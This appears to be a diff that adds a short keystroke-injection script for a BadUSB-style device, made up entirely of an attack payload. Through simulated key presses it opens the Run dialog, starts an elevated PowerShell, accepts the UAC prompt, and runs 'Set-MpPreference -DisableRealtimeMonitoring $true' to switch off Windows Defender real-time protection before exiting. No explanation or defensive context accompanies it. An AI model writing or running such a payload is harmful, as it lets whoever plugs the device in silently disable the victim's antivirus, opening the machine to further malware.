@@ -1,0 +1,12 @@
+CustomDelay:1000
+Press:131+114
+CustomDelay:200
+Print:powershell Start-Process powershell -Verb runAs
+Press:176
+CustomDelay:1000
+Press:130+121
+CustomDelay:200
+Print:Set-MpPreference -DisableRealtimeMonitoring $true
+Press:176
+Print:exit
+Press:176
